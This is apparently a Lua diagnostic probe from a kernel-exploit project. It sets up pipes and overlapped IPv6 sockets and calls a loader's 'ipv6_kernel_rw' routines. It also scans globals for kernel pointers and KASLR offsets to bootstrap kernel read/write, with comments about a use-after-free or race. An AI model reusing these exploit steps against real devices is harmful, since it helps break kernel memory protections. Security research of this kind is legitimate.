-- CRASH_CLASS: MODERATE
-- PROBE 85a: Set up IPv6 kernel R/W manually
-- We have: working syscalls (socket, setsockopt, pipe, close, mmap)
-- The loader has ipv6_kernel_rw with all the functions.
-- The blocker was: init needs kernel R/W to get fd_data_addr (chicken-egg).
-- But the REAL init sequence in the loader creates sockets FIRST,
-- then uses a UAF or race to get the initial kernel pointer.
-- Let's try calling ipv6_kernel_rw functions one at a time.

print("=== PROBE 85a: IPV6 KRW MANUAL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

print("pid=" .. tostring(syscall.getpid()))

-- Step 1: Create pipe pair (needed by ipv6_kernel_rw)
print("--- PIPES ---")
local pipebuf = memory.alloc(8)
memory.write_dword(pipebuf, 0)
memory.write_dword(pipebuf + 4, 0)
local ok1, ret1 = pcall(function()
    return syscall.pipe(uint64(pipebuf))
end)
print("pipe ok=" .. tostring(ok1) .. " ret=" .. tostring(ret1))
local pipe_rd = to_num(memory.read_dword(pipebuf))
local pipe_wr = to_num(memory.read_dword(pipebuf + 4))
print("pipe_fds=" .. pipe_rd .. "," .. pipe_wr)

-- Step 2: Create two IPv6 UDP sockets
print("--- SOCKETS ---")
local ok2, s1 = pcall(function()
    return syscall.socket(uint64(28), uint64(2), uint64(17))
end)
print("sock1 ok=" .. tostring(ok2) .. " fd=" .. tostring(s1))

local ok3, s2 = pcall(function()
    return syscall.socket(uint64(28), uint64(2), uint64(17))
end)
print("sock2 ok=" .. tostring(ok3) .. " fd=" .. tostring(s2))

-- Step 3: Set IPV6_PKTINFO on both sockets
print("--- SETSOCKOPT ---")
local optbuf = memory.alloc(4)
memory.write_dword(optbuf, 1)

if ok2 then
    local ok4, ret4 = pcall(function()
        return syscall.setsockopt(uint64(to_num(s1)), uint64(41), uint64(46),
            uint64(optbuf), uint64(4))
    end)
    print("pktinfo1 ok=" .. tostring(ok4) .. " ret=" .. tostring(ret4))
end

if ok3 then
    local ok5, ret5 = pcall(function()
        return syscall.setsockopt(uint64(to_num(s2)), uint64(41), uint64(46),
            uint64(optbuf), uint64(4))
    end)
    print("pktinfo2 ok=" .. tostring(ok5) .. " ret=" .. tostring(ret5))
end

-- Step 4: Try calling ipv6_kernel_rw.create_pipe_pair
-- This may need kernel R/W already... let's check
print("")
print("--- TRY CREATE_PIPE_PAIR ---")
local ok6, ret6 = pcall(function()
    return ipv6_kernel_rw.create_pipe_pair()
end)
print("pipe_pair ok=" .. tostring(ok6))
if not ok6 then print("err=" .. tostring(ret6)) end

-- Step 5: Try ipv6_kernel_rw.init with our sockets
print("")
print("--- TRY INIT ---")
-- First populate ipv6_kernel_rw.data with our fds
local ok7, ret7 = pcall(function()
    ipv6_kernel_rw.data.master_sock = to_num(s1)
    ipv6_kernel_rw.data.victim_sock = to_num(s2)
    ipv6_kernel_rw.data.pipe_rd = pipe_rd
    ipv6_kernel_rw.data.pipe_wr = pipe_wr
    return "set"
end)
print("set_data ok=" .. tostring(ok7) .. " ret=" .. tostring(ret7))

-- Dump data
if type(ipv6_kernel_rw.data) == "table" then
    for k, v in pairs(ipv6_kernel_rw.data) do
        print("D:" .. tostring(k) .. "=" .. tostring(v))
    end
end

-- Step 6: Check what create_overlapped_ipv6_sockets needs
-- From bytecode: it needs ofiles, kread8, kwrite8 from ipv6_kernel_rw
-- ofiles = file descriptor table kernel address
-- This means we need an INITIAL kernel pointer to bootstrap
-- The loader must get this from somewhere...

-- Check if any global has a kernel pointer
print("")
print("--- KERNEL POINTER SEARCH ---")
local kp_names = {"kernel_base", "kaslr_offset", "data_base", "allproc",
    "curproc", "ofiles_addr"}
for _, name in ipairs(kp_names) do
    if _G[name] then
        print(name .. "=" .. tostring(_G[name]) .. " type=" .. type(_G[name]))
    end
end

-- Check kernel.addr
print("")
print("--- KERNEL.ADDR ---")
if kernel and kernel.addr then
    for k, v in pairs(kernel.addr) do
        print("KA:" .. tostring(k) .. "=" .. tostring(v))
    end
    print("empty=" .. tostring(next(kernel.addr) == nil))
end

-- Clean up
pcall(function() if ok2 then syscall.close(uint64(to_num(s1))) end end)
pcall(function() if ok3 then syscall.close(uint64(to_num(s2))) end end)
pcall(function() if pipe_rd > 0 then syscall.close(uint64(pipe_rd)) end end)
pcall(function() if pipe_wr > 0 then syscall.close(uint64(pipe_wr)) end end)

print("=== PROBE 85a COMPLETE ===")
